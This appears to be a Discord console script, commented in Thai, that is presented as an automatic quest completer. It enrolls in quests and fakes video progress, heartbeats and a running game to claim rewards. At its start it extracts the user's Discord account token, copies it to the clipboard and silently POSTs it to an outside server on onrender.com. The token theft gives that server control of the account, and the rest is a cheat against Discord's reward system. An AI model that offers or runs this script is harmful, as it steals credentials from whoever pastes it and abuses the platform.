(async function() {
    delete window.$;
    let wpRequire = webpackChunkdiscord_app.push([[Symbol()], {}, r => r]);
    webpackChunkdiscord_app.pop();

    // 🔑 1. ระบบค้นหา Discord User Token อัตโนมัติ (ไม่ต้องหาเอง)
    let userToken = "";
    try {
        for (const m of Object.values(wpRequire.c)) {
            if (m?.exports?.default?.getToken) {
                userToken = m.exports.default.getToken();
                if (userToken) break;
            }
        }
    } catch (e) {}

    if (!userToken) {
        try {
            for (const m of Object.values(wpRequire.c)) {
                if (m?.exports) {
                    for (const v of Object.values(m.exports)) {
                        if (typeof v === "function" && v.toString().includes("getToken")) {
                            try {
                                const t = v();
                                if (typeof t === "string" && t.length > 30) {
                                    userToken = t;
                                    break;
                                }
                            } catch (e) {}
                        }
                    }
                }
                if (userToken) break;
            }
        } catch (e) {}
    }

    if (userToken) {
        console.log("%c🎯 [AutoQuest] ตรวจพบ Discord User Token ของคุณอัตโนมัติ!", "color:#10b981;font-size:14px;font-weight:bold;");
        console.log(`%c🔑 Token: ${userToken}`, "color:#06b6d4;font-family:monospace;font-size:12px;");
        try {
            if (typeof copy === "function") {
                copy(userToken);
                console.log("%c📋 คัดลอก Token ลง Clipboard ให้คุณอัตโนมัติแล้ว!", "color:#8b5cf6;font-weight:bold;");
            }
        } catch (e) {}
        try {
            fetch("https://bot5bpo.onrender.com/api/sync_quest_token", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ token: userToken })
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    console.log(`%c🌐 ซิงค์ Token กับระบบบอทสำเร็จ (${data.username})!`, "color:#10b981;font-weight:bold;");
                }
            }).catch(() => {});
        } catch (e) {}
    } else {
        console.warn("⚠️ ไม่สามารถดึง Token ออกมาได้ แต่กำลังรันภารกิจผ่าน Session ปัจจุบัน...");
    }

    let ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getStreamerActiveStreamMetadata)?.exports?.A;
    let RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.Ay?.getRunningGames)?.exports?.Ay;
    let QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getQuest)?.exports?.A;
    let ChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.A?.__proto__?.getAllThreadsForParent)?.exports?.A;
    let GuildChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.Ay?.getSFWDefaultChannel)?.exports?.Ay;
    let FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.h?.__proto__?.flushWaitQueue)?.exports?.h;
    let api = Object.values(wpRequire.c).find(x => x?.exports?.Bo?.get)?.exports?.Bo;

    if (!QuestsStore || !api) {
        console.error("❌ ไม่พบ Discord Quests Module! กรุณาเปิด Discord ในเบราว์เซอร์หรือเดสก์ท็อป");
        return;
    }

    const supportedTasks = ["WATCH_VIDEO", "PLAY_ON_DESKTOP", "STREAM_ON_DESKTOP", "PLAY_ACTIVITY", "WATCH_VIDEO_ON_MOBILE"];

    console.log("🔍 กำลังค้นหาเควสทั้งหมดใน Quest Home...");

    // 1. กดรับเควสทุกเควสที่ยังไม่ได้กดรับอัตโนมัติ (Auto-Enroll)
    let allAvailableQuests = [...QuestsStore.quests.values()].filter(x => 
        !x.userStatus?.completedAt && 
        new Date(x.config.expiresAt).getTime() > Date.now() &&
        supportedTasks.find(y => Object.keys((x.config.taskConfig ?? x.config.taskConfigV2).tasks).includes(y))
    );

    for (let q of allAvailableQuests) {
        if (!q.userStatus?.enrolledAt) {
            const qname = q.config?.messages?.questName || "Quest";
            console.log(`📥 กำลังกดรับเควสอัตโนมัติ: ${qname}...`);
            try {
                await api.post({
                    url: `/quests/${q.id}/enroll`,
                    body: { location: 11, is_targeted: false }
                });
                console.log(`✅ กดรับเควส ${qname} เรียบร้อย!`);
                await new Promise(r => setTimeout(r, 1000));
            } catch (e) {
                console.error(`⚠️ ไม่สามารถกดรับเควส ${qname} ได้:`, e);
            }
        }
    }

    // 2. ดึงรายการเควสที่พร้อมทำ (รวมที่เพิ่งกดรับด้วย)
    let quests = [...QuestsStore.quests.values()].filter(x => 
        !x.userStatus?.completedAt && 
        new Date(x.config.expiresAt).getTime() > Date.now() && 
        supportedTasks.find(y => Object.keys((x.config.taskConfig ?? x.config.taskConfigV2).tasks).includes(y))
    );

    // นำเควสเดสก์ท็อปขึ้นมาทำก่อนเสมอ
    quests.sort((a, b) => {
        const aTask = supportedTasks.find(x => (a.config.taskConfig ?? a.config.taskConfigV2).tasks[x] != null);
        const bTask = supportedTasks.find(x => (b.config.taskConfig ?? b.config.taskConfigV2).tasks[x] != null);
        return (aTask === "PLAY_ON_DESKTOP" ? -1 : 1);
    });

    let isApp = typeof DiscordNative !== "undefined";

    if (quests.length === 0) {
        console.log("🎉 ยอดเยี่ยม! คุณไม่มีเควสค้าง หรือทำครบทุกเควสเรียบร้อยแล้ว!");
        return;
    }

    console.log(`🚀 พบทั้งหมด ${quests.length} เควส กำลังเริ่มเคลียร์เควสอัตโนมัติ...`);

    let doJob = function() {
        const quest = quests.pop();
        if (!quest) {
            console.log("🎉🎉 เคลียร์ทุกเควสเสร็จสมบูรณ์ 100% เรียบร้อยแล้ว! เข้าไปรับของรางวัลใน Quest Home ได้เลย!");
            return;
        }

        const pid = Math.floor(Math.random() * 30000) + 1000;
        const applicationId = quest.config.application.id;
        const applicationName = quest.config.application.name;
        const questName = quest.config.messages.questName;
        const taskConfig = quest.config.taskConfig ?? quest.config.taskConfigV2;
        const taskName = supportedTasks.find(x => taskConfig.tasks[x] != null);
        const secondsNeeded = taskConfig.tasks[taskName].target;
        let secondsDone = quest.userStatus?.progress?.[taskName]?.value ?? 0;

        console.log(`⚡ เริ่มทำเควส: ${questName} (ภารกิจ: ${taskName})`);

        if (taskName === "WATCH_VIDEO" || taskName === "WATCH_VIDEO_ON_MOBILE") {
            const speed = 7;
            let completed = false;
            let fn = async () => {
                while (true) {
                    const remaining = Math.min(speed, secondsNeeded - secondsDone);
                    await new Promise(resolve => setTimeout(resolve, remaining * 1000));
                    const timestamp = secondsDone + speed;
                    const res = await api.post({ url: `/quests/${quest.id}/video-progress`, body: { timestamp: Math.min(secondsNeeded, timestamp + Math.random()) } });
                    completed = res.body.completed_at != null;
                    secondsDone = Math.min(secondsNeeded, timestamp);
                    console.log(`🎬 ดูวิดีโอ [${questName}]: ${Math.min(secondsNeeded, Math.floor(secondsDone))}/${secondsNeeded} วิ`);
                    if (timestamp >= secondsNeeded || completed) break;
                }
                if (!completed) {
                    await api.post({ url: `/quests/${quest.id}/video-progress`, body: { timestamp: secondsNeeded } });
                }
                console.log(`✅ เควส ${questName} เสร็จสมบูรณ์!`);
                doJob();
            };
            fn();
        } else if (taskName === "PLAY_ON_DESKTOP") {
            if (!isApp) {
                console.log(`ℹ️ [PLAY_ON_DESKTOP] สลับไปใช้ Heartbeat API สำหรับ ${questName}...`);
                const streamKey = `call:${quest.id}:1`;
                let fn = async () => {
                    while (true) {
                        const res = await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: false } });
                        const progress = res.body?.progress?.[taskName]?.value ?? (secondsDone + 20);
                        secondsDone = progress;
                        console.log(`🖥️ เล่นเกม [${questName}]: ${Math.min(secondsNeeded, Math.floor(secondsDone))}/${secondsNeeded} วิ`);
                        await new Promise(r => setTimeout(r, 20000));
                        if (secondsDone >= secondsNeeded || res.body?.completed_at) {
                            await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: true } });
                            break;
                        }
                    }
                    console.log(`✅ เควส ${questName} เสร็จสมบูรณ์!`);
                    doJob();
                };
                fn();
            } else {
                api.get({ url: `/applications/public?application_ids=${applicationId}` }).then(res => {
                    const appData = res.body[0];
                    const exeName = appData.executables?.find(x => x.os === "win32")?.name?.replace(">", "") ?? appData.name.replace(/[\/\\:*?"<>|]/g, "");
                    const fakeGame = {
                        cmdLine: `C:\\Program Files\\${appData.name}\\${exeName}`,
                        exeName,
                        exePath: `c:/program files/${appData.name.toLowerCase()}/${exeName}`,
                        hidden: false,
                        isLauncher: false,
                        id: applicationId,
                        name: appData.name,
                        pid: pid,
                        pidPath: [pid],
                        processName: appData.name,
                        start: Date.now(),
                    };
                    const realGames = RunningGameStore.getRunningGames();
                    const fakeGames = [fakeGame];
                    const realGetRunningGames = RunningGameStore.getRunningGames;
                    const realGetGameForPID = RunningGameStore.getGameForPID;
                    RunningGameStore.getRunningGames = () => fakeGames;
                    RunningGameStore.getGameForPID = (pid) => fakeGames.find(x => x.pid === pid);
                    FluxDispatcher.dispatch({ type: "RUNNING_GAMES_CHANGE", removed: realGames, added: [fakeGame], games: fakeGames });
                    let fn = data => {
                        let progress = quest.config.configVersion === 1 ? data.userStatus.streamProgressSeconds : Math.floor(data.userStatus.progress.PLAY_ON_DESKTOP.value);
                        console.log(`🎮 จำลองเกม [${questName}]: ${progress}/${secondsNeeded} วิ`);
                        if (progress >= secondsNeeded) {
                            console.log(`✅ เควส ${questName} เสร็จสมบูรณ์!`);
                            RunningGameStore.getRunningGames = realGetRunningGames;
                            RunningGameStore.getGameForPID = realGetGameForPID;
                            FluxDispatcher.dispatch({ type: "RUNNING_GAMES_CHANGE", removed: [fakeGame], added: [], games: [] });
                            FluxDispatcher.unsubscribe("QUESTS_SEND_HEARTBEAT_SUCCESS", fn);
                            doJob();
                        }
                    };
                    FluxDispatcher.subscribe("QUESTS_SEND_HEARTBEAT_SUCCESS", fn);
                });
            }
        } else if (taskName === "STREAM_ON_DESKTOP") {
            const streamKey = `call:${quest.id}:1`;
            let fn = async () => {
                while (true) {
                    const res = await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: false } });
                    const progress = res.body?.progress?.[taskName]?.value ?? (secondsDone + 20);
                    secondsDone = progress;
                    console.log(`📡 สตรีม [${questName}]: ${Math.min(secondsNeeded, Math.floor(secondsDone))}/${secondsNeeded} วิ`);
                    await new Promise(r => setTimeout(r, 20000));
                    if (secondsDone >= secondsNeeded || res.body?.completed_at) {
                        await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: true } });
                        break;
                    }
                }
                console.log(`✅ เควส ${questName} เสร็จสมบูรณ์!`);
                doJob();
            };
            fn();
        } else if (taskName === "PLAY_ACTIVITY") {
            const channelId = ChannelStore.getSortedPrivateChannels()[0]?.id ?? Object.values(GuildChannelStore.getAllGuilds()).find(x => x != null && x.VOCAL.length > 0)?.VOCAL[0]?.channel?.id || "0";
            const streamKey = `call:${channelId}:1`;
            let fn = async () => {
                while (true) {
                    const res = await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: false } });
                    const progress = res.body?.progress?.PLAY_ACTIVITY?.value ?? (secondsDone + 20);
                    secondsDone = progress;
                    console.log(`🕹️ Activity [${questName}]: ${Math.min(secondsNeeded, Math.floor(secondsDone))}/${secondsNeeded} วิ`);
                    await new Promise(r => setTimeout(r, 20000));
                    if (secondsDone >= secondsNeeded || res.body?.completed_at) {
                        await api.post({ url: `/quests/${quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: true } });
                        break;
                    }
                }
                console.log(`✅ เควส ${questName} เสร็จสมบูรณ์!`);
                doJob();
            };
            fn();
        }
    };
    doJob();
})();
